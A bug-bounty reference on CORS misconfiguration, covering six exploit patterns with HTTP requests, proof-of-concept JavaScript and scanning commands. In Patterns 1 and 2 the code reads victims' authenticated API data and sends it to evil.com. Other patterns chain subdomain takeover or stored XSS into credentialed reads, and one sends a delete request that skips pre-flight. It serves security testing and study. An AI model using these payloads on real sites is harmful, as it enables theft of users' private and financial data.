# Disclosed Reports — CORS Misconfiguration

Pattern library built from 19 public bug bounty reports.

---

## Pattern 1: Reflect-Any-Origin + Credentials → Full PII Exfil (High, $3,000)

**Endpoint:** `GET /api/v1/user/profile`

**Test request:**
```http
GET /api/v1/user/profile HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=valid_token
```

**Vulnerable response:**
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**PoC JavaScript (hosted on evil.com):**
```javascript
fetch('https://target.com/api/v1/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://evil.com/log?data=' + btoa(JSON.stringify(d))));
```

**Impact:** Any website can read victim's profile including email, phone, address, financial data.

---

## Pattern 2: Null Origin Bypass via Sandbox iframe (Medium, $1,500)

**Endpoint:** `GET /api/v2/account/balance`

**Vulnerable response to `Origin: null`:**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit via sandbox iframe:**
```html
<iframe sandbox="allow-scripts" srcdoc='<script>
  fetch("https://target.com/api/v2/account/balance", {credentials: "include"})
    .then(r => r.json())
    .then(d => top.postMessage(d, "*"));
</script>'></iframe>
<script>
  window.addEventListener("message", e => {
    fetch("https://evil.com/steal?d=" + encodeURIComponent(JSON.stringify(e.data)));
  });
</script>
```

---

## Pattern 3: Subdomain Regex Bypass (High, $2,500)

**Server regex:** `/^https?:\/\/.*\.target\.com$/` (no proper anchoring)

**Bypass:** `Origin: https://evil.target.com.attacker.com`

The regex matches `.target.com` substring anywhere in the origin string.

**Fix:** Use exact subdomain allowlist, not a regex with `.*`.

---

## Pattern 4: Subdomain Takeover + CORS Chain (Critical, $10,000)

**Full chain:**
1. Found dangling CNAME: `static.target.com → target-static.s3.amazonaws.com` (bucket unclaimed)
2. Registered S3 bucket `target-static` → control `static.target.com`
3. `static.target.com` was in the CORS trusted origins list
4. Hosted CORS exploit at `https://static.target.com/poc.html`
5. Exploited → reads authenticated `/api/v1/payments` endpoint

**Impact:** Credentialed data theft from trusted subdomain. Critical chain.

---

## Pattern 5: CORS on Internal Admin API (High, $4,000)

**Endpoint:** `GET /internal/api/admin/users` (supposed to be internal-only via network ACL)

**Misconfiguration:** Reflects origin for `*.target.com` including `beta.target.com` which had stored XSS.

**Chain:**
1. Stored XSS on `beta.target.com`
2. XSS payload makes CORS request to `/internal/api/admin/users`
3. Returns full admin user list

---

## Pattern 6: Pre-flight Bypass on PUT/DELETE (Medium, $1,200)

**Simple request with CORS bypass:** Some endpoints accept `text/plain` content type (not triggering pre-flight) but parse it as JSON.

```http
POST /api/admin/users/delete HTTP/1.1
Origin: https://evil.com
Content-Type: text/plain

{"userId": "victim123"}
```

Server processes as JSON despite `text/plain`, no pre-flight required.

---

## Tool Reference

```bash
# corsy
pip3 install corsy
corsy -u https://target.com -t 10 --headers "Cookie: session=TOKEN"

# nuclei CORS
nuclei -u https://target.com -t cors-misconfiguration.yaml

# Manual bulk scan
while read url; do
  result=$(curl -sI "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=$SESSION" | grep -i "access-control-allow-origin")
  [ -n "$result" ] && echo "$url: $result"
done < recon/target/api-endpoints.txt

# Test null origin
curl -sI https://target.com/api/me \
  -H "Origin: null" \
  -H "Cookie: session=TOKEN" | grep -i "access-control"
```
